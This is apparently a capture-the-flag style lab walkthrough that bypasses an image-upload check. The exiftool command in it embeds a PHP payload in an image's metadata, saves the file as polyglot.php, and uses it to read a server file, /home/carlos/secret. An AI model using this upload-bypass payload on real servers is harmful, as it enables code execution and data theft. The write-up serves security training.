![image](https://github.com/udayk01/Web-Security/assets/52235763/f165dbfa-3b29-43fb-9410-748ad62c02c4)

## Solution:

> When the exploit PHP code was attempted to be uploaded, the server refused access, claiming it was not an image file.

![image](https://github.com/udayk01/Web-Security/assets/52235763/d3921bed-4745-4300-b4de-217a696b5cb1)

> Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata using exiftoolwith this command

```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.png -o polyglot.php```

![image](https://github.com/udayk01/Web-Security/assets/52235763/80727c47-d7d8-4a84-91c5-0e1e8b514fb0)

>> This adds your PHP payload to the image's Comment field, then saves the image with a .php extension.

> In the browser, upload the polyglot image as your avatar,

![image](https://github.com/udayk01/Web-Security/assets/52235763/a1d86189-f12f-4a73-8b2b-796aaa2884e0)

> Then go back to the account page.

 ![image](https://github.com/udayk01/Web-Security/assets/52235763/8eef6a0c-51fb-4c00-b607-8a0db579aa91)

> In Burp's proxy history, find the GET ```/files/avatars/polyglot.php``` request.

![image](https://github.com/udayk01/Web-Security/assets/52235763/8f191ef9-177e-4da1-acb4-5323577dc2d0)

> Use the message editor's search feature to find the START string somewhere within the binary image data in the response. Between this and the END string, you should see Carlos's secret.

![image](https://github.com/udayk01/Web-Security/assets/52235763/cb6d3df0-8bdc-421b-b119-17d96a05929c)

> Secret Message: OZ61PxSpwk0pcCS3ria7M8XT5HsJq9Pb

![image](https://github.com/udayk01/Web-Security/assets/52235763/a4d1b1bf-eddb-4964-97d2-e9233f6fc184)


